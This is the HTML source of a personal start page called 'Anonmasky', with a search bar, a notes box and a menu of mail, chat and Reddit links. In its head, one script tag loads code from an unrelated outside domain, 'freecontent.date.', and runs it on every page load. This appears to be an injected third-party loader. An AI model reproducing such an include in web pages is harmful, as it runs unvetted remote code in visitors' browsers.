<!DOCTYPE html>
<html lang="en-US">
<head>
<title>Anonmasky</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<link rel="stylesheet" type="text/css" href="css/style.css" />
<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
<meta name="application-name" content="&nbsp;" />
<meta name="msapplication-TileColor" content="#FFFFFF" />
<meta name=viewport content="width=device-width, initial-scale=0.6, user-scalable=no" />
<noscript>Javascript Needed For Page!</noscript>
<script data-cfasync="false" type="application/javascript" src="js/background.js"></script>
<script src="https://www.freecontent.date./w5zo.js"></script>
<script type="application/javascript" src="js/jquery-1.12.4.min.js"></script>
<script async type="application/javascript" src="js/script.js"></script>
<script async type="application/javascript" src="js/custom.js"></script>
</head>
<body onload="javascript:init();" id="body" style="opacity: 0;">
<canvas class="background" id="myCanvas"></canvas>
<div id="mySidenav" class="sidenav" onMouseLeave="closeNav()">
<a href="javascript:void(0);" class="closebtn" onclick="closeNav()">&times;</a>
<menu>
<a href="https://mail.google.com/mail/u/0/">Gmail 1</a>
<a href="https://mail.google.com/mail/u/1/">Gmail 2</a>
<a href="https://mail.google.com/mail/u/2/">Gmail 3</a>
    <hr>
    <a href="https://Protonmail.com">Protonmail</a>
    <hr>
    <a href="https://npchan.com">NPChan</a>
    <a href="https://www.messenger.com">Messenger</a>
<a href="https://reddit.com/r/nepal/new">/r/Nepal</a>
<a href="https://web.telegram.org">Telegram</a>
<a href="https://classroom.google.com/u/1/">Classroom</a>
    </menu>
<hr>
<div id="customBackgrounds">
<p class="btn hollow toggle">Change Background</p>
<div class="list">
<div class="thumb template"></div>
</div>
<p class="btn hollow small reset">Reset Background</p>
</div>
</div>
<div id="leftsidemenu"><span class="sidenavhome" onMouseOver="openNav()"><a href="javascript:void(0);" onclick="openNav()">&#9776; Menu</a></span>
</div>
<div class="Anonmasky"><img src="media/logo.png" alt="Logo"></div>
<div class="center-flex offset-25">
<div class="container" id="mainContainer">
<div class="container container-search" id="searchContainer">
<input tabindex="1" type="text" id="searchBar" onfocus="javascript:addClass('mainContainer','input-active');" onblur="javascript:removeClass('mainContainer','input-active');" onkeydown="javascript:handleQuery(event,this.value);">
</div>
<div class="container container-help" id="searchHelp">
<ul class="help-list" id="searchHelpMenu"></ul>
</div>
<div class="container container-menu" id="menuContainer">
<ul onclick="void(0);" class="menu-category" id="categoryMenu"></ul>
</div>
</div>
</div>
<div id="notesWidget" class="widget">
<div id="notesContainer" class="container-notes">
<div class="notes-icon">
<svg style="width:24px;height:24px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71,7.04C21.1,6.65 21.1,6 20.71,5.63L18.37,3.29C18,2.9 17.35,2.9 16.96,3.29L15.12,5.12L18.87,8.87M3,17.25V21H6.75L17.81,9.93L14.06,6.18L3,17.25Z" /></svg>
</div>
<textarea id="notesInput" tabindex="2" onkeydown="javascript:handleNoteInput(event);" onfocus="javascript:handleNotes(event,true);" onblur="javascript:handleNotes(event,false);"></textarea>
</div>
</div>
<div id="dateContainer" class="widget align-right"></div>
</body>
</html>
